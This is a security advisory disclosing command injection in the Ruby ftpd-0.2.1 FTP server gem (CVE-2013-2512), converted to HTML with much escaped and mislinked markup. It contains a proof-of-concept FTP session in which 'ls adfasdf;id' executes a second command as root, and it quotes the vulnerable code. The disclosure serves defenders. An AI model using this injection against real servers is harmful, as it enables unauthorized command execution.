<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title></title>
<meta name="generator" content="HTML::TextToHTML v2.51"/>
</head>
<body>
<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
    white-space: -moz-pre-wrap; /</em> Firefox <em>/
    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
    white-space: -o-pre-wrap;   /</em> Opera 7 */
    word-wrap: break-word;<br/>
}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 34&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Remote command execution for Ruby Gem ftpd-0.2.1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2013-02-18&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://rubygems.org/gems/ftpd">http://rubygems.org/gems/ftpd</a>"&gt;<a href="http://rubygems.org/gems/ftpd&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://rubygems.org/gems/ftpd&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="https://github.com/wconrad&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://github.com/wconrad&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2013-02-18&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="https://github.com/wconrad&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://github.com/wconrad&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;ftpd is a pure Ruby FTP server library. It supports implicit and explicit TLS, passive and active mode, and most of the commands specified in <a href="http://www.cis.ohio-state.edu/rfc/rfc969.txt">RFC 969</a>. It an be used as part of a test fixture or embedded in a program.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The ls interface can have commands injected into it if option or filename contain the shell character ; The example.rb server listens to localhost only which I used to test the ftp library. But if this gem is used normally it could be configured to listen on <a href="telnet://0.0.0.0">0.0.0.0</a>.
</p><dl>
  <dt>PoC</dt>
<dd>for this to work the file must exist in the CWD.
ftp&amp;gt; root@ubuntu:/tmp# sh /tmp/connect-to-example-ftp-server.sh
Connected to localhost.
220 ftpd
Name (localhost:root):
331 Password required
  </dd><dt>Password</dt>
<dd>230 Logged in
Remote system type is UNIX.
Using binary mode to transfer files.  <ul>
    <li>I created the filename adfasdf  </li></ul>
</dd></dl>
<p>ftp&amp;gt; ls adfasdf;id<br/>
200 PORT command successful<br/>
150 Opening ASCII mode data connection<br/>
-rw-r--r-- 1 root root 0 Mar 2 05:52 adfasdf
uid=0(root) gid=0(root) groups=0(root)<br/>
226 Transfer complete<br/>
ftp&amp;gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2013-2512 &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=34"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #339933;"&gt;./&lt;/span&gt;ftpd&lt;span style="color: #339933;"&gt;-&lt;/span&gt;0&lt;span style="color: #339933;"&gt;.&lt;/span&gt;2&lt;span style="color: #339933;"&gt;.&lt;/span&gt;1&lt;span style="color: #339933;"&gt;/&lt;/span&gt;lib&lt;span style="color: #339933;"&gt;/&lt;/span&gt;ftpd&lt;span style="color: #339933;"&gt;/&lt;/span&gt;disk_file_system&lt;span style="color: #339933;"&gt;.&lt;/span&gt;rb&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;The problem code is below&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;204&lt;/span&gt; Ls &lt;span style="color: #000000; font-weight: bold;"&gt;interface&lt;/span&gt; used by &lt;a href="<a href="http://www.php.net/list">http://www.php.net/list</a>"&gt;&lt;span style="color: #990000;"&gt;List&lt;/span&gt;&lt;/a&gt; and NameList &lt;span style="color: #cc66cc;"&gt;205&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;206&lt;/span&gt; module Ls&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;207&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;208&lt;/span&gt;       def ls&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;ftp_path&lt;span style="color: #339933;"&gt;,&lt;/span&gt; option&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;209&lt;/span&gt;         path &lt;span style="color: #339933;"&gt;=&lt;/span&gt; expand_ftp_path&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;ftp_path&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;210&lt;/span&gt;         &lt;a href="<a href="http://www.php.net/dirname">http://www.php.net/dirname</a>"&gt;&lt;span style="color: #990000;"&gt;dirname&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;File&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;a href="<a href="http://www.php.net/dirname">http://www.php.net/dirname</a>"&gt;&lt;span style="color: #990000;"&gt;dirname&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;path&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;211&lt;/span&gt;         filename &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;File&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;a href="<a href="http://www.php.net/basename">http://www.php.net/basename</a>"&gt;&lt;span style="color: #990000;"&gt;basename&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;path&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;212&lt;/span&gt;         command &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;213&lt;/span&gt;           &lt;span style="color: #0000ff;"&gt;'ls'&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;214&lt;/span&gt;           option&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;215&lt;/span&gt;           filename&lt;span style="color: #339933;"&gt;,&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;lt;--&lt;/span&gt; &lt;span style="color: #339933;"&gt;;&lt;/span&gt;cmd inject&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;216&lt;/span&gt;           &lt;span style="color: #0000ff;"&gt;'2&amp;gt;&amp;amp;1'&lt;/span&gt;&lt;span style="color: #339933;"&gt;,&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;217&lt;/span&gt;         &lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;a href="<a href="http://www.php.net/compact">http://www.php.net/compact</a>"&gt;&lt;span style="color: #990000;"&gt;compact&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;a href="<a href="http://www.php.net/join">http://www.php.net/join</a>"&gt;&lt;span style="color: #990000;"&gt;join&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;' '&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;218&lt;/span&gt;         &lt;span style="color: #b1b100;"&gt;if&lt;/span&gt; &lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;File&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;.&lt;/span&gt;exists?&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;a href="<a href="http://www.php.net/dirname">http://www.php.net/dirname</a>"&gt;&lt;span style="color: #990000;"&gt;dirname&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;lt;-&lt;/span&gt; &lt;a href="<a href="http://www.php.net/file">http://www.php.net/file</a>"&gt;&lt;span style="color: #990000;"&gt;file&lt;/span&gt;&lt;/a&gt; has to exist to &lt;a href="<a href="http://www.php.net/exec">http://www.php.net/exec</a>"&gt;&lt;span style="color: #990000;"&gt;exec&lt;/span&gt;&lt;/a&gt; ls command&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;219&lt;/span&gt;           &lt;a href="<a href="http://www.php.net/list">http://www.php.net/list</a>"&gt;&lt;span style="color: #990000;"&gt;list&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #339933;"&gt;=&lt;/span&gt; &lt;a href="<a href="http://www.php.net/dir">http://www.php.net/dir</a>"&gt;&lt;span style="color: #990000;"&gt;Dir&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;.&lt;/span&gt;&lt;a href="<a href="http://www.php.net/chdir">http://www.php.net/chdir</a>"&gt;&lt;span style="color: #990000;"&gt;chdir&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;a href="<a href="http://www.php.net/dirname">http://www.php.net/dirname</a>"&gt;&lt;span style="color: #990000;"&gt;dirname&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt; &lt;span style="color: #b1b100;"&gt;do&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #cc66cc;"&gt;220&lt;/span&gt;             `&lt;span style="color: #009900;"&gt;&amp;#123;&lt;/span&gt;command&lt;span style="color: #009900;"&gt;&amp;#125;&lt;/span&gt;` &lt;span style="color: #339933;"&gt;&amp;lt;--&lt;/span&gt; &lt;a href="<a href="http://www.php.net/exec">http://www.php.net/exec</a>"&gt;&lt;span style="color: #990000;"&gt;exec&lt;/span&gt;&lt;/a&gt;&iuml;&raquo;&iquest;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/ftp-0.2.1-remote-exec.html">http://www.vapid.dhs.org/advisories/ftp-0.2.1-remote-exec.html</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/ftp-0.2.1-remote-exec.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/ftp-0.2.1-remote-exec.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
&lt;/html&gt;
</p>

</body>
</html>
